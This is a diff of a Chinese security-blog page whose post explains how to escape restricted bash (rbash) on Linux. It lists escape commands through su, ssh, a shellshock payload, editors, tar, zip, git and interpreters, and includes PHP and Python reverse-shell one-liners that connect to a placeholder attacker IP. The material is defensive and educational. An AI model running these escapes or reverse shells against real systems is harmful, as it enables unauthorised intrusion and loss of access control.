 <p>这里复现了一波，步骤为直接输入<code>pico -s "/bin/bash"</code>，然后按ctrl+o会让你编写文件名，文件名随意写，接着按ctrl+t，然后执行你想要的命令如whoami，id等等即可</p>
 <h2 id="6-5-环境变量修复">6.5 环境变量修复</h2>
 <p>获取到的Shell，环境变量可能会缺失，在这里可以通过如下命令进行修复</p>
-<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">export PATH=$PATH:/sbin:/usr/sbin:/bin:/usr/bin<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token environment constant">$PATH</span>:/sbin:/usr/sbin:/bin:/usr/bin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <h1>0x07 简单实战</h1>
 <h2 id="7-1-创建测试用户">7.1 创建测试用户</h2>
 <p>使用具有sudo特权的用户创建一个新测试用户</p>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">useradd -m <span class="hljs-built_in">test</span> -s /bin/rbash <span class="hljs-comment">## 创建一个用户名为test，并且设置test登录shell为rbash</span><br>passwd <span class="hljs-built_in">test</span>					<span class="hljs-comment">## 为test设置密码</span><br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230927212751837.png" alt="image-20230927212751837"></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">useradd</span> <span class="token parameter variable">-m</span> <span class="token builtin class-name">test</span> <span class="token parameter variable">-s</span> /bin/rbash <span class="token comment">## 创建一个用户名为test，并且设置test登录shell为rbash</span>
+<span class="token function">passwd</span> <span class="token builtin class-name">test</span>					<span class="token comment">## 为test设置密码</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><img src="/2023/09/27/linux-ti-quan-xue-xi-yi/image-20230927212751837.png" alt="image-20230927212751837"></p>
 <p>这里密码为123456</p>
 <h3 id="7-1-1-为新用户建立目录">7.1.1 为新用户建立目录</h3>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> /home/test/bin<br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230927212847642.png" alt="image-20230927212847642"></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> /home/test/bin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/2023/09/27/linux-ti-quan-xue-xi-yi/image-20230927212847642.png" alt="image-20230927212847642"></p>
 <h3 id="7-1-2-指定用户可以运行的命令">7.1.2 指定用户可以运行的命令</h3>
 <p>为用户指定可以运行的命令，创建指向新建目录链接。指定用户可以运行<code>mkdir``ls``ping</code></p>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s /bin/bash /bin/rbash <span class="hljs-comment">## 从Bash 创建一个名为rbash的符号链接</span><br><span class="hljs-built_in">ln</span> -s /bin/mkdir /home/test1/bin <br><br><span class="hljs-built_in">ln</span> -s /bin/ls /home/test1/bin<br><br><span class="hljs-built_in">ln</span> -s /bin/ping /home/test1/bin<br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230927213119353.png" alt="image-20230927213119353"></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ln</span> <span class="token parameter variable">-s</span> /bin/bash /bin/rbash <span class="token comment">## 从Bash 创建一个名为rbash的符号链接</span>
+<span class="token function">ln</span> <span class="token parameter variable">-s</span> /bin/mkdir /home/test1/bin 
+
+<span class="token function">ln</span> <span class="token parameter variable">-s</span> /bin/ls /home/test1/bin
+
+<span class="token function">ln</span> <span class="token parameter variable">-s</span> /bin/ping /home/test1/bin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/2023/09/27/linux-ti-quan-xue-xi-yi/image-20230927213119353.png" alt="image-20230927213119353"></p>
 <h2 id="7-2-rbash逃逸">7.2 rbash逃逸</h2>
 <h3 id="7-2-1-切换用户时逃逸">7.2.1 切换用户时逃逸</h3>
 <p>这里的原理涉及到su 和 su- 的区别：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">su命令，只会更改当前用户，而不会更改当前的用户环境，比如你从oracle 用户su到root账户中，当前路径仍是你刚才的路径，环境变量仍是oracle用户的<br><br>su- 命令，则在更改当前用户信息的同时还会更改用户环境，但是假如你从oracle 用户su -到root账户，你会发现你的当前路径已经变为/root/，环境变量也变了<br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230927213422218.png" alt="image-20230927213422218"></p>
+<pre class="line-numbers language-none"><code class="language-none">su命令，只会更改当前用户，而不会更改当前的用户环境，比如你从oracle 用户su到root账户中，当前路径仍是你刚才的路径，环境变量仍是oracle用户的
+
+su- 命令，则在更改当前用户信息的同时还会更改用户环境，但是假如你从oracle 用户su -到root账户，你会发现你的当前路径已经变为/root/，环境变量也变了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><img src="/2023/09/27/linux-ti-quan-xue-xi-yi/image-20230927213422218.png" alt="image-20230927213422218"></p>
 <p>逃逸：</p>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">su -l test1<br>su - test1<br>su --login test1<br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230927213823393.png" alt="image-20230927213823393"></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">su</span> <span class="token parameter variable">-l</span> test1
+<span class="token function">su</span> - test1
+<span class="token function">su</span> <span class="token parameter variable">--login</span> test1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><img src="/2023/09/27/linux-ti-quan-xue-xi-yi/image-20230927213823393.png" alt="image-20230927213823393"></p>
 <p>这里我并未复现成功，就先看个图吧</p>
 <h3 id="7-2-2-ssh登录时逃逸">7.2.2 ssh登录时逃逸</h3>
 <p>（借助-t远程在远程机器上运行脚本）</p>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh username@IP -t <span class="hljs-string">"/bin/sh"</span> or <span class="hljs-string">"/bin/bash"</span><br>ssh username@IP -t <span class="hljs-string">"bash --noprofile"</span><br>ssh username@IP -t <span class="hljs-string">"() { :; }; /bin/bash"</span>   <span class="hljs-comment">###shellshock</span><br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> username@IP <span class="token parameter variable">-t</span> <span class="token string">"/bin/sh"</span> or <span class="token string">"/bin/bash"</span>
+<span class="token function">ssh</span> username@IP <span class="token parameter variable">-t</span> <span class="token string">"bash --noprofile"</span>
+<span class="token function">ssh</span> username@IP <span class="token parameter variable">-t</span> <span class="token string">"() { :; }; /bin/bash"</span>   <span class="token comment">###shellshock</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <h3 id="7-2-3-当前shell中逃逸">7.2.3 当前shell中逃逸</h3>
 <h4 id="7-2-3-1-特殊情况">7.2.3.1 特殊情况</h4>
 <p>[1] / 被允许的情况下；直接 /bin/sh 或 /bin/bash</p>
 <p>[2]能够设置PATH或SHELL时</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">export PATH=$PATH:/bin/:/usr/bin:$PATH<br>export SHELL=/bin/sh<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">export PATH=$PATH:/bin/:/usr/bin:$PATH
+export SHELL=/bin/sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>[3]权限足够时</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">cp /bin/sh /path/ ;sh<br>或<br>cp /bin/bash /path/ ;sh<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">cp /bin/sh /path/ ;sh
+或
+cp /bin/bash /path/ ;sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <h3 id="7-2-4-利用系统常见应用逃逸">7.2.4 利用系统常见应用逃逸</h3>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[1]ftp<br>[2]more<br>[3]less<br>[4]man<br>[5]vi<br>[6]vim<br>以上在输入的地方输入!/bin/sh 或 !/bin/bash<br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230927214155912.png" alt="image-20230927214155912"></p>
+<pre class="line-numbers language-none"><code class="language-none">[1]ftp
+[2]more
+[3]less
+[4]man
+[5]vi
+[6]vim
+以上在输入的地方输入!/bin/sh 或 !/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/2023/09/27/linux-ti-quan-xue-xi-yi/image-20230927214155912.png" alt="image-20230927214155912"></p>
 <h3 id="7-2-5-利用用户安装应用逃逸">7.2.5 利用用户安装应用逃逸</h3>
 <h4 id="1、ed-editor">1、ed-editor</h4>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ed<br>!'/bin/sh'<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">ed
+!'/bin/sh'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <h4 id="2、git">2、git</h4>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">git help status <br>!/bin/bash<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">git help status 
+!/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <h4 id="3、zip">3、zip</h4>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <h4 id="4、tar">4、tar</h4>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">tar cf /dev/null filename --checkpoint=1 --checkpoint-action=exec=/bin/bash<br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230927214312060.png" alt="image-20230927214312060"></p>
+<pre class="line-numbers language-none"><code class="language-none">tar cf /dev/null filename --checkpoint=1 --checkpoint-action=exec=/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/2023/09/27/linux-ti-quan-xue-xi-yi/image-20230927214312060.png" alt="image-20230927214312060"></p>
 <h3 id="7-2-6-利用编程语言环境绕过">7.2.6 利用编程语言环境绕过</h3>
 <h4 id="1、python">1、python</h4>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">python -c 'import os; os.system("/bin/sh")'<br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230927214351901.png" alt="image-20230927214351901"></p>
+<pre class="line-numbers language-none"><code class="language-none">python -c 'import os; os.system("/bin/sh")'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/2023/09/27/linux-ti-quan-xue-xi-yi/image-20230927214351901.png" alt="image-20230927214351901"></p>
 <p>这里也是解密了，原来是在真实情况下才可以。。。</p>
 <h4 id="2、php">2、php</h4>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">php -a then exec("sh -i");<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">php -a then exec("sh -i");<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>这里仍未复现成功，它提示我语法错误？？？不理解</p>
 <p>使用PHP反弹设shell绕过</p>
-<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">攻击机开启监听``nc -lvp PORT``目标机建立连接``php -r <span class="hljs-string">'$sock=fsockopen("IP",PORT);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span><br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">攻击机开启监听<span class="token string backtick-quoted-string">``</span>nc <span class="token operator">-</span>lvp <span class="token constant">PORT</span><span class="token string backtick-quoted-string">``</span>目标机建立连接<span class="token string backtick-quoted-string">``</span>php <span class="token operator">-</span>r <span class="token string single-quoted-string">'$sock=fsockopen("IP",PORT);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <h4 id="3、perl">3、perl</h4>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">perl -e 'exec "/bin/sh";'<br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230927214552077.png" alt="image-20230927214552077"></p>
+<pre class="line-numbers language-none"><code class="language-none">perl -e 'exec "/bin/sh";'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/2023/09/27/linux-ti-quan-xue-xi-yi/image-20230927214552077.png" alt="image-20230927214552077"></p>
 <h4 id="4、lua">4、lua</h4>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">os.execute('/bin/sh')<br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230927214652108.png" alt="image-20230927214652108"></p>
+<pre class="line-numbers language-none"><code class="language-none">os.execute('/bin/sh')<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/2023/09/27/linux-ti-quan-xue-xi-yi/image-20230927214652108.png" alt="image-20230927214652108"></p>
 <p>同PHP。。。估计真是语法问题？</p>
 <h4 id="5、ruby">5、ruby</h4>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">exec "/bin/sh"<br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230927214724097.png" alt="image-20230927214724097"></p>
+<pre class="line-numbers language-none"><code class="language-none">exec "/bin/sh"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/2023/09/27/linux-ti-quan-xue-xi-yi/image-20230927214724097.png" alt="image-20230927214724097"></p>
 <h4 id="6、expect">6、expect</h4>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">spwan sh<br>sh<br></code></pre></td></tr></tbody></table></figure>
-<p><img src="image-20230927214742434.png" alt="image-20230927214742434"></p>
+<pre class="line-numbers language-none"><code class="language-none">spwan sh
+sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><img src="/2023/09/27/linux-ti-quan-xue-xi-yi/image-20230927214742434.png" alt="image-20230927214742434"></p>
 <h1>0x08 tips:</h1>
 <p>8.1 比rbash更容易遇到的问题是当前路径异常问题</p>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span>  <span class="hljs-comment">###一般很多命令基础执行不了的时候，都是路径异常，查看该值可验证    </span><br><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin   <span class="hljs-comment">####修复</span><br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token environment constant">$PATH</span>  <span class="token comment">###一般很多命令基础执行不了的时候，都是路径异常，查看该值可验证    </span>
+<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token environment constant">$PATH</span>:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin   <span class="token comment">####修复</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>8.2 不能使用 &gt; ，&gt;&gt;等字符重定向写文件：echo ‘script code’ | tee scriptfile</p>
 <p>8.3 su切换用户逃逸时还可以在切换用户时执行spawn shell命令</p>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">su -c <span class="hljs-string">"python -c  'import pty;pty.spawn(\"/bin/bash\")'"</span> test1<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">su</span> <span class="token parameter variable">-c</span> <span class="token string">"python -c  'import pty;pty.spawn(<span class="token entity" title="\&quot;">\"</span>/bin/bash<span class="token entity" title="\&quot;">\"</span>)'"</span> test1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>8.4 ssh 登录时同样可以通过spawn shell逃逸</p>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh username@IP  <span class="hljs-string">"export TERM=xterm;python -c  'import pty;pty.spawn(\"/bin/bash\")'</span><br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> username@IP  "export <span class="token assign-left variable"><span class="token environment constant">TERM</span></span><span class="token operator">=</span>xterm<span class="token punctuation">;</span>python <span class="token parameter variable">-c</span>  <span class="token string">'import pty;pty.spawn(\"/bin/bash\")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>8.5 编程语言绕过的利用，还可以使用反弹shell到我们攻击机的方式进行逃逸，以python为例：</p>
-<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python -c <span class="hljs-string">'import       socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LISTENING IP",LISTENING PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span><br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">'import       socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LISTENING IP",LISTENING PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>8.6 上边用的比较多的是 !/bin/sh 和 !/bin/bash;其实还有一个 !‘sh’ —&gt;由于没有了 ‘/’ ；有时候能够达到很好的绕过效果</p>
-<p><img src="image-20230927215051670.png" alt="image-20230927215051670"></p>
+<p><img src="/2023/09/27/linux-ti-quan-xue-xi-yi/image-20230927215051670.png" alt="image-20230927215051670"></p>
 <p>8.7 同理在路径正确的情况下，在当前rbash中直接输入 sh 也能够完成逃逸( !/bin/sh 和 !/bin/bash 逃逸失败报错同[6] )</p>
-<p><img src="image-20230927215130750.png" alt="image-20230927215130750"></p>
+<p><img src="/2023/09/27/linux-ti-quan-xue-xi-yi/image-20230927215130750.png" alt="image-20230927215130750"></p>
 <h1>0x09 总结</h1>
 <p>这次也就是简单的演示了一下各种情况，毕竟环境配置也很难很烦，因此就草草了事，只需要记得有这些姿势即可，在实战时遇到问题在对应解决。</p>
 <p>上述这些逃逸方式应用到其他类型的restricted shell中也是可以的，由于不同系统特性不同，逃逸的方式也有很大差异；再就是用户限制的宽松程度不同，我们能够逃逸的方式也不同；用户安装的git、tar、zip等应用也能够给予很大的帮助；总之就是要多尝试，灵活应用！！！</p>
@@ -773,100 +790,7 @@
                 </div>
             </div>
             
-                <style>
-    #reward {
-        margin: 40px 0;
-        text-align: center;
-    }
-
-    #reward .reward-link {
-        font-size: 1.4rem;
-        line-height: 38px;
-    }
-
-    #reward .btn-floating:hover {
-        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
-    }
-
-    #rewardModal {
-        width: 320px;
-        height: 350px;
-    }
-
-    #rewardModal .reward-title {
-        margin: 15px auto;
-        padding-bottom: 5px;
-    }
-
-    #rewardModal .modal-content {
-        padding: 10px;
-    }
-
-    #rewardModal .close {
-        position: absolute;
-        right: 15px;
-        top: 15px;
-        color: rgba(0, 0, 0, 0.5);
-        font-size: 1.3rem;
-        line-height: 20px;
-        cursor: pointer;
-    }
-
-    #rewardModal .close:hover {
-        color: #ef5350;
-        transform: scale(1.3);
-        -moz-transform:scale(1.3);
-        -webkit-transform:scale(1.3);
-        -o-transform:scale(1.3);
-    }
-
-    #rewardModal .reward-tabs {
-        margin: 0 auto;
-        width: 210px;
-    }
-
-    .reward-tabs .tabs {
-        height: 38px;
-        margin: 10px auto;
-        padding-left: 0;
-    }
-
-    .reward-content ul {
-        padding-left: 0 !important;
-    }
-
-    .reward-tabs .tabs .tab {
-        height: 38px;
-        line-height: 38px;
-    }
-
-    .reward-tabs .tab a {
-        color: #fff;
-        background-color: #ccc;
-    }
-
-    .reward-tabs .tab a:hover {
-        background-color: #ccc;
-        color: #fff;
-    }
-
-    .reward-tabs .wechat-tab .active {
-        color: #fff !important;
-        background-color: #22AB38 !important;
-    }
-
-    .reward-tabs .alipay-tab .active {
-        color: #fff !important;
-        background-color: #019FE8 !important;
-    }
-
-    .reward-tabs .reward-img {
-        width: 210px;
-        height: 210px;
-    }
-</style>
-
-<div id="reward">
+                <div id="reward">
     <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
 
     <!-- Modal Structure -->
@@ -907,6 +831,275 @@
     
 
     
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: 'fYyLqrwhVuigWcIYcP9sPbBv-MdYXbMMI',
+        appKey: 'ht8iOzVaHwm0miBUeumGrxDF',
+        serverURLs: '',
+        notify: 'false' === 'true',
+        verify: 'false' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'mm',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: 'just go go'
+    });
+</script>
+
+<!--酷Q推送-->
+
 
     
 
@@ -1019,9 +1212,12 @@
 <!-- 代码块功能依赖 -->
 <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
 
-<!-- 代码语言 -->
 
-<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.js"></script>
+
+
+<!-- 代码语言 -->
 
 
 <!-- 代码块复制 -->
@@ -1031,7 +1227,6 @@
 
 <!-- 代码块收缩 -->
 
-<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
 
 
     </div>
@@ -1061,19 +1256,6 @@
